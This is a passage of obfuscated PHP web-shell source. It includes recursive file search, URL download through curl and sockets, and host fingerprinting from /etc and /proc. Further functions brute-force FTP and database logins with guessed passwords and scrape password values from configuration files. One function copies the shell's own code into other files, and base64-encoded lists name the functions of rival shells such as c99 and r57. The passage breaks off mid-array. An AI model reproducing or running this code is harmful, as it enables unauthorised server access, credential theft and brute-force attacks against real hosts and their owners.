                $bool = (@empty($ar["sn_reg"]) && @strpos($f, $ar["sn"]) !== false) || ($ar["sn_reg"] && @preg_match("/" . $ar["sn"] . "/", $f));
                if (z4j($d . $f)) {
                    $search_i_d++;
                    if (@empty($ar["st"]) && (@empty($ar["s_fd"]) || $ar["s_fd"] == "2") && $bool) {
                        $found[] = $d . $f;
                        $found_d++;
                    }
                    if (!z3j($d . $f)) {
                        if (@empty($s_rec)) {
                            z5f($d . $f);
                        } elseif (@is_numeric($s_rec)) {
                            $countrec = @count(@explode('/', @substr($d . $f, @strlen($sdir))));
                            if ($countrec <= $s_rec) {
                                z5f($d . $f);
                            }
                        }
                    }
                } else {
                    if (@empty($ar["s_fd"]) || $ar["s_fd"] == "1") {
                        $search_i_f++;
                        if ($bool) {
                            if (!@empty($ar["st"])) {
                                $r = z9p($d . $f);
                                if ($ar["st_wwo"]) {
                                    $ar["st"] = " " . @trim($ar["st"]) . " ";
                                }
                                if (!$ar["st_cs"]) {
                                    $ar["st"] = @strtolower($ar["st"]);
                                    $r = @strtolower($r);
                                }
                                if ($ar["st_reg"]) {
                                    $bool = @preg_match("/" . $ar["st"] . "/", $r);
                                } else {
                                    $bool = @strstr($r, $ar["st"]);
                                }
                                if ($ar["st_not"]) {
                                    $bool = !$bool;
                                }
                                if ($bool) {
                                    $found[] = $d . $f;
                                    $found_f++;
                                }
                            } else {
                                $found[] = $d . $f;
                                $found_f++;
                            }
                        }
                    }
                }
            }
        }
    }
}

function z5s($path, $wildcards, $recursive, $find = false) {
    global $nix, $sh_exec;
    $ar_f = $ar_w = array();
    $path = @trim($path);
    $path = z1a($path);
    if (z4j($path)) {
        $tmpw = @explode(";", $wildcards);
        if (@count($tmpw) > 0) {
            foreach (@array_unique($tmpw) as $tmp) {
                $tmp = @trim($tmp);
                if (!@empty($tmp) && !@in_array($tmp, $ar_w)) {
                    $ar_w[] = $tmp;
                }
            }
            if (@count($ar_w) > 0) {
                if ($find) {
                    if ($nix && $sh_exec) {
                        if (!@is_numeric($recursive) || $recursive == "0") {
                            $recursive = 1;
                        } else {
                            $recursive++;
                        }
                        $searchres = '';
                        foreach ($ar_w as $tmpw) {
                            $searchres .= z9t('find "' . $path . '" -maxdepth ' . $recursive . ' -type f -name "' . $tmpw . '"');
                        }
                        if ($searchres != '') {
                            $tmpres = @explode("\n", $searchres);
                            $searchres = '';
                            foreach (@array_unique($tmpres) as $tmp_f) {
                                $tmp_f = @trim($tmp_f);
                                if (!@in_array($tmp_f, $ar_f)) {
                                    $ar_f[] = $tmp_f;
                                }
                            }
                        }
                    }
                } else {
                    $fpaths = $tpaths = $spaths = array();
                    $tpath = '';
                    $tpaths[] = '';
                    if (@is_numeric($recursive) && $recursive > 0) {
                        for ($i = 0; $i < $recursive; $i++) {
                            $tpath .= '*/';
                            $tpaths[] = $tpath;
                        }
                    }
                    foreach (@array_unique($tpaths) as $tpath) {
                        foreach (@array_unique($ar_w) as $fpath) {
                            $fpath = @trim($fpath);
                            if (!@empty($fpath)) {
                                $fpaths[] = $tpath . $fpath;
                            }
                        }
                    }
                    foreach (@array_unique($fpaths) as $fpath) {
                        $spaths[] = $path . $fpath;
                    }
                    unset($fpaths);
                    unset($tpaths);
                    foreach ($spaths as $spath) {
                        $tglob = @glob($spath);
                        if (@count($tglob) > 0) {
                            foreach ($tglob as $tfile) {
                                if (!@in_array($tfile, $ar_f)) {
                                    $ar_f[] = $tfile;
                                }
                            }
                        }
                    }
                    unset($spaths);
                }
            }
        }
    }
    return @array_unique($ar_f);
}

function z3a($u) {
    $s = @curl_init();
    @curl_setopt($s, CURLOPT_URL, $u);
    @curl_setopt($s, CURLOPT_USERAGENT, z7x('2', 'downloada'));
    @curl_setopt($s, CURLOPT_RETURNTRANSFER, true);
    $r = @curl_exec($s);
    @curl_close($s);
    return $r;
}

function z2f($u) {
    $r = '';
    if (!@strstr($u, '://')) {
        return $r;
    }

    $s = @substr($u, 0, @strpos($u, '://') + 3);
    $uh = @substr($u, @strlen($s));
    $e = @explode('/', $uh);
    $h = $e[0];
    $p = @substr($uh, @strlen($h));
    $fp = @fsockopen($h, 80, $errno, $errstr, 30);
    @fputs($fp, "GET $p HTTP/1.1\r\n");
    @fputs($fp, "Host: $h\r\n");
    @fputs($fp, "User-Agent: " . z7x('2', 'downloada') . "\r\n");
    @fputs($fp, "Connection: close\r\n\r\n");
    while (!@feof($fp) && ($debug = @fgets($fp)) != "\r\n");
    while (!@feof($fp)) {
        $r .= @fgets($fp, 1024);
    }
    @fclose($fp);
    return $r;
}

function z3h($host, $user, $pass, $port, $timeout) {
    $ftp = @ftp_connect($host, $port, $timeout);
    if (!$ftp) {
        return "failed";
    } else {
        if (@ftp_login($ftp, $user, $pass)) {
            return "valid";
        } else {
            return "invalid";
        }
        @ftp_close($ftp);
    }
}

function z2t($host, $port, $time, $try1, $try2, $try3, $try4, $user, $pass = NULL) {
    $count = 0;
    $success = 0;
    $res = 0;
    $log = "";
    if ($pass != NULL) {
        $count++;
        $res = z3h($host, $user, $pass, $port, $time);
        if ($res == "failed") {
            echo "Can't connect to $host:$port\r\n";
            return false;
        }
        if ($res == "valid") {
            echo "[+] $user:$pass - success\r\n";
            $log .= "ftp://$host:$port - $user $pass\r\n";
            $success++;
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z3h($host, $user, z9i($pass), $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($pass) . " - success\r\n";
                $log .= "ftp://$host:$port - $user " . z9i($pass) . "\r\n";
                $success++;
            }
        }
    } else {
        $count++;
        $res = z3h($host, $user, $user, $port, $time);
        if ($res == "failed") {
            echo "Can't connect to $host:$port\r\n";
            return false;
        }
        if ($res == "valid") {
            echo "[+] $user:$user - success\r\n";
            $log .= "ftp://$host:$port - $user $user\r\n";
            $success++;
        }
        if ($res != "valid" && $try1 == "1") {
            $count++;
            $res = z3h($host, $user, @strrev($user), $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . @strrev($user) . " - success\r\n";
                $log .= "ftp://$host:$port - $user " . @strrev($user) . "\r\n";
                $success++;
            }
        }
        if ($res != "valid" && $try2 == "1") {
            $count++;
            $res = z3h($host, $user, $user . "1", $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "1 - success\r\n";
                $log .= "ftp://$host:$port - $user " . $user . "1\r\n";
                $success++;
            }
        }
        if ($res != "valid" && $try3 == "1") {
            $count++;
            $res = z3h($host, $user, $user . "123", $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "123 - success\r\n";
                $log .= "ftp://$host:$port - $user " . $user . "123\r\n";
                $success++;
            }
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z3h($host, $user, z9i($user), $port, $time);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($user) . " - success\r\n";
                $log .= "ftp://$host:$port - $user " . z9i($user) . "\r\n";
                $success++;
            }
        }
    }
    return array($count, $success, $log);
}

function z4u($host, $user, $pass, $port, $dbtype, $base = '') {
    $sql = new my_sql();
    $sql->db = $dbtype;
    $sql->host = $host;
    $sql->port = $port;
    $sql->user = $user;
    $sql->pass = $pass;
    if ($base != '') {
        $sql->base = $base;
    }
    if ($sql->connect()) {
        return "valid";
    } else {
        return "invalid";
    }
}

function z2e($host, $port, $dbtype, $try1, $try2, $try3, $try4, $user, $pass = NULL, $sqldb = '') {
    $count = 0;
    $success = 0;
    $res = 0;
    $log = "";
    if ($pass != NULL) {
        $count++;
        $res = z4u($host, $user, $pass, $port, $dbtype, $sqldb);
        if ($res == "valid") {
            echo "[+] $user:$pass - success\r\n";
            $log .= "$dbtype - $host:$port - $user $pass\r\n";
            $success++;
        }
        if ($res != "valid" && $try1 == "1") {
            $count++;
            $res = z4u($host, $user, @strrev($pass), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . @strrev($pass) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $pass " . @strrev($user) . "\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z4u($host, $user, z9i(@strrev($pass)), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i(@strrev($pass)) . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i(@strrev($pass)) . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try2 == "1") {
            $count++;
            $res = z4u($host, $user, $pass . "1", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $pass . "1 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $pass . "1\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z4u($host, $user, z9i($pass . "1"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($pass . "1") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($pass . "1") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try3 == "1") {
            $count++;
            $res = z4u($host, $user, $pass . "123", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $pass . "123 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $pass . "123\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z4u($host, $user, z9i($pass . "123"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($pass . "123") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($pass . "123") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z4u($host, $user, z9i($pass), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($pass) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . z9i($pass) . "\r\n";
                $success++;
            }
        }
    } else {
        $count++;
        $res = z4u($host, $user, $user, $port, $dbtype, $sqldb);
        if ($res == "valid") {
            echo "[+] $user:$user - success\r\n";
            $log .= "$dbtype - $host:$port - $user $user\r\n";
            $success++;
        }
        if ($res != "valid" && $try1 == "1") {
            $count++;
            $res = z4u($host, $user, @strrev($user), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . @strrev($user) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . @strrev($user) . "\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z4u($host, $user, z9i(@strrev($user)), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i(@strrev($user)) . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i(@strrev($user)) . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try2 == "1") {
            $count++;
            $res = z4u($host, $user, $user . "1", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "1 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $user . "1\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z4u($host, $user, z9i($user . "1"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($user . "1") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($user . "1") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try3 == "1") {
            $count++;
            $res = z4u($host, $user, $user . "123", $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . $user . "123 - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . $user . "123\r\n";
                $success++;
            }
            if ($res != "valid" && $try4 == "1") {
                $count++;
                $res = z4u($host, $user, z9i($user . "123"), $port, $dbtype, $sqldb);
                if ($res == "valid") {
                    echo "[+] $user:" . z9i($user . "123") . " - success\r\n";
                    $log .= "$dbtype - $host:$port - $user " . z9i($user . "123") . "\r\n";
                    $success++;
                }
            }
        }
        if ($res != "valid" && $try4 == "1") {
            $count++;
            $res = z4u($host, $user, z9i($user), $port, $dbtype, $sqldb);
            if ($res == "valid") {
                echo "[+] $user:" . z9i($user) . " - success\r\n";
                $log .= "$dbtype - $host:$port - $user " . z9i($user) . "\r\n";
                $success++;
            }
        }
    }
    return array($count, $success, $log);
}

function z2w($a, $b, $c) {
    global $count, $success, $log;
    $count += $a;
    $success += $b;
    $log .= $c;
}

function z0j($a, $d) {
    $z = new ZipArchive;
    if ($z->open($a) === TRUE) {
        $z->extractTo($d);
        $z->close();
        return TRUE;
    } else {
        return FALSE;
    }
}

function z0b($return = false) {
    @ob_start();
    @phpinfo(-1);
    $pi = @preg_replace(array('#^.*<body>(.*)</body>.*$#ms', '#<h2>PHP License</h2>.*$#ms', '#<h1>Configuration</h1>#', "#\r?\n#", "#</(h1|h2|h3|tr)>#", '# +<#', "#[ \t]+#", '#&nbsp;#', '#  +#', '# class=".*?"#', '%&#039;%', '#<tr>(?:.*?)" src="(?:.*?)=(.*?)" alt="PHP Logo" /></a>' . '<h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#', '#<h1><a href="(?:.*?)\?=(.*?)">PHP Credits</a></h1>#', '#<tr>(?:.*?)" src="(?:.*?)=(.*?)"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#', "# +#", '#<tr>#', '#</tr>#'), array('$1', '', '', '', '</$1>' . "\n", '<', ' ', ' ', ' ', '', ' ', '<h2>PHP Configuration</h2>' . "\n" . '<tr><td>PHP Version</td><td>$2</td></tr>' . "\n" . '<tr><td>PHP Egg</td><td>$1</td></tr>', '<tr><td>PHP Credits Egg</td><td>$1</td></tr>', '<tr><td>Zend Engine</td><td>$2</td></tr>' . "\n" . '<tr><td>Zend Egg</td><td>$1</td></tr>', ' ', '%S%', '%E%'), @ob_get_clean());
    $sections = @explode('<h2>', @strip_tags($pi, '<h2><th><td>'));
    unset($sections[0]);
    $pi = array();
    foreach ($sections as $section) {
        $n = @substr($section, 0, @strpos($section, '</h2>'));
        @preg_match_all('#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#', $section, $askapache, PREG_SET_ORDER);
        foreach ($askapache as $m) {
            $pi[$n][$m[1]] = (@isset($m[2]) && (!@isset($m[3]) || $m[2] == $m[3])) ? $m[2] : @array_slice($m, 2);
        }
    }
    return ($return === false) ? print_r($pi) : $pi;
}

function z1n() {
    $distros = array("SUSE LINUX" => "SuSE-release;UnitedLinux-release", "Mandrake" => "mandrake-release", "MandrivaLinux" => "mandrake-release", "Gentoo" => "gentoo-release", "Fedora" => "fedora-release", "RedHat" => "redhat-release;redhat_version", "Slackware" => "slackware-release;slackware-version", "Trustix" => "trustix-release;trustix-version", "FreeEOS" => "eos-version", "Arch" => "arch-release", "Cobalt" => "cobalt-release", "LinuxFromScratch" => "lfs-release", "Rubix" => "rubix-version", "Ubuntu" => "lsb-release", "PLD" => "pld-release", "CentOS" => "redhat-release;redhat_version", "LFS" => "lfs-release;lfs_version", "HLFS" => "hlfs-release;hlfs_version", "Debian" => "debian_release;debian_version");
    foreach ($distros as $k => $v) {
        $fs = @explode(";", $v);
        foreach ($fs as $f) {
            if (z4q("/etc/" . $f)) {
                $t = @str_replace("\n", "", z9p("/etc/" . $f));
                $t = @trim($t);
                if (@preg_match("/description=\"(.*)\"/i", $t, $m)) {
                    return $m[1];
                } else {
                    return $k . " ($t)";
                }
            }
        }
    }
    return "Unknown";
}

function z3f() {
    $r = z9s("430");
    $c = $k = $b = "";
    $f = z9p("/proc/cpuinfo");
    if (!@empty($f)) {
        $a = @explode("\n", $f);
        $n = 0;
        for ($i = 0; $i < @count($a); $i++) {
            @list($x, $y) = @explode(":", $a[$i]);
            $x = @rtrim($x);
            $y = @rtrim($y);
            if ($x == "processor") {
                $n++;
                $r = $n;
            }
            if ($x == "vendor_id") {
                $r .= $y;
            }
            if ($x == "model name") {
                $r .= $y;
            }
            if ($x == "cpu MHz") {
                $r .= " " . @floor($y);
                $k = "y";
            }
            if ($x == "cache size") {
                $c = $y;
            }
            if ($x == "bogomips") {
                $b = $y;
            }
        }
        if ($k != "y") {
            $r .= " <b>unknown</b>";
        }

        $r .= " MHz / Cache: $c / BogoMIPS: $b";
    }
    return $r;
}

function z2g($used) {
    return '<div class="' . z4m("4", "3") . '"><div class="' . z4m("5", "3") . '" style="width:' . (($used > 100) ? "100" : $used) . '%;">&nbsp;</div></div>';
}

function z5a() {
    global $sh_exec, $nix;
    $mem = $buff = $swap = array("", z9s("430"));
    if ($nix && $sh_exec) {
        $m = z9t("free -b");
        if (!@empty($m)) {
            $e = @explode("\n", $m);
            foreach ($e as $l) {
                if (@preg_match('/mem:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $used = @round(($t[2] / $t[1]) * 100);
                    $mem = array(z2g($used), z9s("426", z7c($t[1])) . " " . z9s("429", z7c($t[2])) . " (" . $used . "%) " . z9s("465", z7c($t[3])));
                } elseif (@preg_match('/swap:\s*([0-9]+)\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $used = @round(($t[2] / $t[1]) * 100);
                    $swap = array(z2g($used), z9s("426", z7c($t[1])) . " " . z9s("429", z7c($t[2])) . " (" . $used . "%) " . z9s("465", z7c($t[3])));
                } elseif (@preg_match('/-\/\+ buffers\/cache:\s*([0-9]+)\s*([0-9]+)/i', $l, $t)) {
                    $tot = ($t[1] + $t[2]);
                    $used = @round(($t[1] / $tot) * 100);
                    $buff = array(z2g($used), z9s("426", z7c($tot)) . " " . z9s("429", z7c($t[1])) . " (" . $used . "%) " . z9s("465", z7c($t[2])));
                }
            }
        }
    }
    return array($mem, $buff, $swap);
}

function z9e() {
    global $nix, $sh_exec, $dtotal, $dfree, $dused, $win;
    $it = @intval($dtotal);
    $iu = @intval($dused);
    $used = @round(($iu / $it) * 100);
    $r = array(array(z2g($used), z9s("426", $dtotal) . " " . z9s("429", $dused) . " (" . $used . "%) " . z9s("465", $dfree)));
    if ($win && z7r('disk_free_space') && z7r('disk_total_space')) {
        $tr = array();
        foreach (@range("B", "Z") as $let) {
            if (z4q($let . ":/")) {
                $free = @disk_free_space($let . ":/");
                $total = @disk_total_space($let . ":/");
                if ($free === false) {
                    $free = 0;
                }
                if ($total === false) {
                    $total = 0;
                }
                if ($free < 0) {
                    $free = 0;
                }
                if ($total < 0) {
                    $total = 0;
                }

                $used = ($total - $free);
                $pused = @round(($used / $total) * 100);
                $tr[$let . ":"] = array(z2g($pused), z9s("426", z7c($total)) . " " . z9s("429", z7c($used)) . " (" . $pused . "%) " . z9s("465", z7c($free)));
            }
        }
        if (@count($tr) !== 0) {
            $r = $tr;
        }
    } elseif ($nix && $sh_exec) {
        $df = z9t("df -B1");
        if (!@empty($df)) {
            $e = @explode("\n", $df);
            @array_shift($e);
            $tr = array();
            foreach ($e as $l) {
                $p = @preg_split("/ /", $l, NULL, PREG_SPLIT_NO_EMPTY);
                if (@count($p) !== 6) {
                    break;
                }

                $used = @round(($p[2] / $p[1]) * 100);
                $tr[$p[5]] = array(z2g($used), z9s("426", z7c($p[1])) . " " . z9s("429", z7c($p[2])) . " (" . $used . "%) " . z9s("465", z7c($p[3])) . " FS: " . $p[0]);
            }
            if (@count($tr) !== 0) {
                $r = $tr;
            }
        }
    }
    return $r;
}

function z1m($file, $user) {
    global $passarray;
    if (!@isset($passarray)) {
        $passarray = array();
    }
    if (!@isset($passarray[$user])) {
        $passarray[$user] = array();
    }

    $f = z9p($file);
    if (!empty($f)) {
        $regvar = '/\$([A-Za-z_][A-Za-z_0-9]*)\s*=\s*([\'"]{1})([^\2\s\t\r\n]+)\2\s*;/';
        $regvar1 = '/([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1[\s\t\r\n]*=>[\s\t\r\n]*([\'"]{1})([^\3\s\t\r\n]+)\3/';
        $regvar2 = '/\[([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1\][\s\t\r\n]*=[\s\t\r\n]*([\'"]{1})([^\3\s\t\r\n]+)\3/';
        $regconst = '/define\s*\(([\'"]{1})([A-Za-z_][A-Za-z_0-9]*)\1\s*,\s*([\'"]{1})([^\3\s\t\r\n]+)\3\s*\)\s*;/';
        if (@preg_match_all($regvar, $f, $m)) {
            $var = $m[1];
            $val = $m[3];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
        if (@preg_match_all($regvar1, $f, $m)) {
            $var = $m[2];
            $val = $m[4];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
        if (@preg_match_all($regvar2, $f, $m)) {
            $var = $m[2];
            $val = $m[4];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
        if (@preg_match_all($regconst, $f, $m)) {
            $var = $m[2];
            $val = $m[4];
            for ($i = 0; $i < @count($var); $i++) {
                if (@preg_match('/pass/i', $var[$i])) {
                    if (!@empty($val[$i]) && !@in_array($val[$i], $passarray[$user])) {
                        $passarray[$user][] = $val[$i];
                    }
                }
            }
            unset($var);
            unset($val);
            unset($m);
        }
    }
    unset($f);
}

function z2q($file) {
    if (!z4e($file)) {
        return false;
    }

    $me = z9p(__FILE__);
    if (!$me) {
        return false;
    }
    return z9y($file, $me);
}

function z2y($file, $possible = 0, $replace = 0) {
    $replaced = "";
    $knownfunc = array("c99/variant" => @explode("||", @base64_decode("ZnNlYXJjaCgkZCl8fGZ0cGJydXRlY2hlY2soJGhvc3QsJHBvcnQsJHRpbWVvdXQsJGxvZ2luLCRwYXNzLCRzaCwkZnFiX29ubHl3aXRoc2gpfHxnZXRzb3VyY2UoJGZuKXx8c2hleGl0KCl8fF9idWZmX3ByZXBhcmUoKXx8X3Nlc3NfcHV0KCRkYXRhKXx8ZGlzcGxheXNlY2luZm8oJG5hbWUsJHZhbHVlKXx8ZnNfY29weV9kaXIoJGQsJHQpfHxmc19jb3B5X29iaigkZCwkdCl8fGZzX21vdmVfZGlyKCRkLCR0KXx8ZnNfbW92ZV9vYmooJGQsJHQpfHxmc19ybWRpcigkZCl8fGZzX3Jtb2JqKCRvKXx8Z2V0bWljcm90aW1lKCl8fG15c2hlbGxleGVjKCRjbWQpfHxteXNxbF9zbWFydGVycm9yKCR0eXBlLCRzb2NrKXx8b25waHBzaHV0ZG93bigpfHxwYXJzZXNvcnQoJHNvcnQpfHxwYXJzZV9wZXJtcygkbW9kZSl8fHN0cjJtaW5pKCRjb250ZW50LCRsZW4pfHx0YWJzb3J0KCRhLCRiKXx8dmlld19wZXJtcygkbW9kZSl8fHZpZXdfcGVybXNfY29sb3IoJG8pfHx2aWV3X3NpemUoJHNpemUp")), "r57/variant" => @explode("||", @base64_decode("Y2YoJGZuYW1lLCR0ZXh0KXx8Y2hhbmdlX2RpdnN0KGlkKXx8Y2xvc2UoKXx8Y29tcHJlc3MoJiRmaWxlbmFtZSwmJGZpbGVkdW1wLCRjb21wcmVzcyl8fGNvbm5lY3QoKXx8Y3goKXx8RGlyRmlsZXNSKCRkaXIsJHR5cGVzPScnKXx8ZGl2KCRpZCl8fGR1bXAoJHRhYmxlKXx8ZXJyKCRuLCR0eHQ9JycpfHxleCgkY2ZlKXx8R2V0RmlsZU1hdGNoZXNDb3VudCgpfHxHZXRGaWxlc1RvdGFsKCl8fEdldE1hdGNoZXNDb3VudCgpfHxHZXRSZXN1bHRGaWxlcygpfHxHZXRUaW1lVG90YWwoKXx8R2V0VGl0bGVzKCl8fGdldF91c2VycygkZmlsZW5hbWUpfHxpbigkdHlwZSwkbmFtZSwkc2l6ZSwkdmFsdWUsJGNoZWNrZWQ9MCl8fGxvY2F0ZSgkcHIpfHxtYWlsYXR0YWNoKCR0bywkZnJvbSwkc3ViaiwkYXR0YWNoKXx8bW9yZXJlYWQoJHRlbXApfHxtb3Jld3JpdGUoJHRlbXAsJHN0cj0nJyl8fHBlcm1zKCRtb2RlKXx8cmVhZHpsaWIoJGZpbGVuYW1lLCR0ZW1wPScnKXx8c2FmZV9leCgkY2ZlKXx8U2VhcmNoUmVzdWx0KCRkaXIsJHRleHQsJGZpbHRlcj0nJyl8fFNlYXJjaFRleHQoJHBocmFzZT0wLCRjYXNlPTApfHxzaG93X2RpdihpZCl8fHNyKCRsLCR0MSwkdDIpfHx0b1VURigkeCl8fFVfdmFsdWUoJHZhbHVlKXx8VV93b3Jkd3JhcCgkc3RyKXx8dmlld19zaXplKCRzaXplKXx8d2hpY2goJHByKXx8d3MoJGkp")), "c37" => @explode("||", @base64_decode("Q2hlY2tCYXNlNjQoJEhhc2gpfHxDaGVja0hFWCgkSGFzaCwkQ2FzZSl8fENvbmZpZ3VyZUNoZWNrQm94ZXNQZXJtaXNzaW9ucygpfHxDb25maWd1cmVQZXJtaXNzaW9ucyh1c2VyKXx8R2V0TGFzdEVycm9yKCl8fEdldFBlcm1zKCYkRik=")), "BOFF" => @explode("||", @base64_decode("YShhLGMscDEscDIscDMsY2hhcnNldCl8fGFjdGlvbkJydXRlZm9yY2UoKXx8YWN0aW9uQ29uc29sZSgpfHxhY3Rpb25GaWxlc01hbigpfHxhY3Rpb25GaWxlc1Rvb2xzKCl8fGFjdGlvbkxvZ291dCgpfHxhY3Rpb25OZXR3b3JrKCl8fGFjdGlvblBocCgpfHxhY3Rpb25SQygpfHxhY3Rpb25TYWZlTW9kZSgpfHxhY3Rpb25TZWNJbmZvKCl8fGFjdGlvblNlbGZSZW1vdmUoKXx8YWN0aW9uU3FsKCl8fGFjdGlvblN0cmluZ1Rvb2xzKCl8fEJPRkZFeCgkaW4pfHxCT0ZGRm9vdGVyKCl8fEJPRkZIZWFkZXIoKXx8Qk9GRkxvZ2luKCl8fEJPRkZQZXJtcygkcCl8fEJPRkZQZXJtc0NvbG9yKCRmKXx8Qk9GRlJlY3Vyc2l2ZUdsb2IoJHBhdGgpfHxCT0ZGc3RyaXBzbGFzaGVzKCRhcnJheSl8fEJPRkZWaWV3U2l6ZSgkcyl8fEJPRkZXaGljaCgkcCl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGJydXRlRm9yY2UoJGlwLCRwb3J0LCRsb2dpbiwkcGFzcyl8fGNmKCRmLCR0KXx8Y29weV9wYXN0ZSgkYywkcywkZCl8fERiQ2xhc3MoJHR5cGUpfHxkZWxldGVEaXIoJHBhdGgpfHxtb3ZlX3Bhc3RlKCRjLCRzLCRkKXx8cHJvY2Vzc1JlcUNoYW5nZSgp")), "devshell" => @explode("||", @base64_decode("Y2xpY2tjbWQoKXx8Y3MoJHQpfHxkbGZpbGUoJHUsJHApfHxkbGZpbGUoJHVybCwkZnBhdGgpfHxleGUoJGMpfHxncCgkZil8fGdzKCRmKXx8aW5pdCgpfHxybWRpcnMoJGQpfHxycCgkdCl8fHNob3dkaXIoJHB3ZCwkcHJvbXB0LCR3aW4pfHxzcygkdCl8fHNzYygkdCl8fHN3ZCgkcCl8fHR1a2FyKGwsYil8fHh3aGljaCgkcHIp")), "Egy" => @explode("||", @base64_decode("Y2FsbGZ1bmNzKCRjbW5kKXx8Y2FsbHpvbmUoJG5zY2Rpcil8fGNmKCRmbmFtZSwkdGV4dCl8fGNoYW5nZV9kaXZzdChpZCl8fGNoYW5nZV9kaXZzdChpZCl8fGNsb3NlKCl8fGNvbXByZXNzKCYkZmlsZW5hbWUsJiRmaWxlZHVtcCwkY29tcHJlc3MpfHxkZWxtKCRkZWxtdHh0KXx8RGlyRmlsZXNSKCRkaXIsJHR5cGVzPScnKXx8ZG93bmxvYWQoJGR3ZmlsZSl8fGV4KCRjZmUpfHxHZXRGaWxlTWF0Y2hlc0NvdW50KCl8fEdldEZpbGVzVG90YWwoKXx8R2V0TWF0Y2hlc0NvdW50KCl8fGdldG1pY3JvdGltZSgpfHxHZXRSZXN1bHRGaWxlcygpfHxHZXRUaW1lVG90YWwoKXx8R2V0VGl0bGVzKCl8fGluKCR0eXBlLCRuYW1lLCRzaXplLCR2YWx1ZSwkY2hlY2tlZD0wKXx8aW5jbGluaygkbGluaywkdmFsKXx8bWFpbGF0dGFjaCgkdG8sJGZyb20sJHN1YmosJGF0dGFjaCl8fG1vcmVyZWFkKCR0ZW1wKXx8bW9yZXdyaXRlKCR0ZW1wLCRzdHI9JycpfHxyZWFkemxpYigkZmlsZW5hbWUsJHRlbXA9JycpfHxzYWZlX2V4KCRjZmUpfHxTZWFyY2hSZXN1bHQoJGRpciwkdGV4dCwkZmlsdGVyPScnKXx8U2VhcmNoVGV4dCgkcGhyYXNlPTAsJGNhc2U9MCl8fHNldF9lbmNvZGVyX2lucHV0KHRleHQpfHxVX3dvcmR3cmFwKCRzdHIpfHx2aWV3X3NpemUoJHNpemUp")), "itsecteam" => @explode("||", 